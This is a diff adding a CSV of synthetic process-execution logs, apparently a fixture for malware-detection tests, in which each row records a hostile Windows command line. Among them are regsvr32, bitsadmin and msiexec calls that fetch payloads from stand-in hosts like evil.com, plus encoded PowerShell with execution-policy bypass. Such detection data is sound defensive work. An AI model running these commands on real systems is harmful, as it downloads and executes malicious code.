@@ -1,0 +1,11 @@
+process_name,file_path,hash,command_line,parent_process,user,host
+powershell.exe,C:\Users\user\AppData\Local\Temp\ps.exe,badbadbadbadbadbadbadbadbadbadb,powershell.exe -NoProfile -ExecutionPolicy Bypass -e JABjAGwAaQBlAG4AdAA,excel.exe,user1,INFECTED-01
+regsvr32.exe,C:\Windows\System32\regsvr32.exe,12345678901234567890123456789012,regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll,rundll32.exe,user1,INFECTED-01
+bitsadmin.exe,C:\Windows\System32\bitsadmin.exe,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,bitsadmin /transfer myJob http://malware.com/backdoor.exe C:\Users\Public\backdoor.exe,cmd.exe,user2,INFECTED-02
+cscript.exe,C:\Windows\System32\cscript.exe,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,cscript.exe //B C:\Users\user\AppData\Local\Temp\malicious.js,outlook.exe,user2,INFECTED-02
+msiexec.exe,C:\Windows\System32\msiexec.exe,cccccccccccccccccccccccccccccccc,msiexec /q /i http://badsite.com/installer.msi,powershell.exe,user3,INFECTED-03
+wmic.exe,C:\Windows\System32\wbem\wmic.exe,dddddddddddddddddddddddddddddddd,wmic process call create calc.exe,cmd.exe,user3,INFECTED-03
+rundll32.exe,C:\Users\Public\Downloads\update.exe,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,rundll32.exe javascript:"\..\mshtml\,RunHTMLApplication",document.write(),winword.exe,user4,INFECTED-04
+installutil.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe,ffffffffffffffffffffffffffffffff,installutil.exe /logfile= /LogToConsole=false /U malicious.dll,powershell.exe,user4,INFECTED-04
+regsvcs.exe,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe,00000000000000000000000000000001,regsvcs.exe malicious.dll,cmd.exe,user5,INFECTED-05
+msbuild.exe,C:\Program Files (x86)\MSBuild\14.0\Bin\msbuild.exe,00000000000000000000000000000002,msbuild.exe malicious.csproj,powershell.exe,user5,INFECTED-05
